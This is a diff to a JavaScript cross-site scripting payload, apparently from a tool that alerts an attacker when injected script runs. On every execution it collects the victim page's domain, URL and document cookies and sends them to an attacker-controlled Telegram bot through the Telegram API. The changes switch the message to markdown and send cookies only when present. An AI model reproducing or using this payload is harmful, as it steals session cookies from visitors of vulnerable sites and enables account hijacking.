@@ -12,9 +12,10 @@ var chatId = '31337'; // Your "chatId" Here
 */
 
 function telegramSend(tokenBot, chatId) {
-	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
+	var kuki = document['cookie'].length != 0 ? '%0d%0a*-+Document+Cookie+-*%0d%0a`' + document['cookie'] + '`' : '';
+	var textData = '*XSS+Alert+in+' + document['domain']+'*%0d%0a------------------------------------------------%0d%0a%0d%0a*-+URL+Target+-*%0d%0a`' + document['URL'] + '`%0d%0a' + kuki;
     var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
+    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=markdown', true);
     xhr.send();
 }
 telegramSend(tokenBot, chatId)
